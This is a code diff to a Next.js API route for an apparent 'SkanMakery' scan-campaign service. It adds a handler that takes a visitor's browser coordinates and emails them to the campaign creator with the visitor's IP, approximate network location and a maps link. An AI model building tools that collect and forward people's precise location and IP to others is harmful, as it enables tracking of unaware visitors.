@@ -57,6 +57,17 @@ export async function POST(req:Request,{params}:{params:Promise<{slug:string}>})
   if(!to)to=String(process.env.ADMIN_GMAIL||process.env.ADMIN_EMAIL||"").trim().toLowerCase();
   if(!to)return NextResponse.json({error:"Creator email not found"},{status:500});
 
+  const action=req.headers.get("x-skan-action")||"capture";
+  if(action==="location"){
+   const body=await req.json().catch(()=>({}));const lat=Number(body.latitude),lon=Number(body.longitude),accuracy=Number(body.accuracy||0);
+   if(!Number.isFinite(lat)||!Number.isFinite(lon))return NextResponse.json({error:"Location coordinates are required."},{status:400});
+   const v=visitor(req),now=new Date();
+   const html=`<!doctype html><html><body style="margin:0;background:#f3f6fb;font-family:Arial;color:#172033"><div style="max-width:650px;margin:auto;padding:25px"><div style="background:#111827;color:#fff;padding:25px;border-radius:22px 22px 0 0"><b style="color:#a5b4fc">SKANMAKERY • LOCATION ALERT</b><h1 style="margin:10px 0">New location scan 📍</h1><p style="color:#d1d5db">A visitor allowed browser location access.</p></div><div style="background:#fff;padding:25px;border-radius:0 0 22px 22px"><h2>${esc(c.name)}</h2><p><b>Latitude:</b> ${lat}<br><b>Longitude:</b> ${lon}<br><b>Accuracy:</b> ${Number.isFinite(accuracy)?accuracy+" meters":"Unknown"}</p><p><b>IP:</b> ${esc(v.ip)}<br><b>Approx. network location:</b> ${esc(approxLocation(v))}</p><a href="https://www.google.com/maps?q=${lat},${lon}" style="display:inline-block;padding:12px 16px;background:#635bff;color:#fff;text-decoration:none;border-radius:10px">Open in Maps →</a><p style="font-size:12px;color:#64748b;margin-top:22px">Browser coordinates are provided only after the visitor explicitly grants location permission.</p></div></div></body></html>`;
+   await sendMail(to,"📍 SkanMakery — New Location · "+c.name,html);
+   await db.collection("scan_campaigns").updateOne({_id:c._id},{$inc:{locations:1},$set:{lastLocationAt:now,lastCaptureIp:v.ip,lastCaptureCountry:v.country}});
+   return NextResponse.json({ok:true});
+  }
+
   const form=await req.formData();
   const file=form.get("file");
   if(!(file instanceof File))return NextResponse.json({error:"Capture file missing"},{status:400});
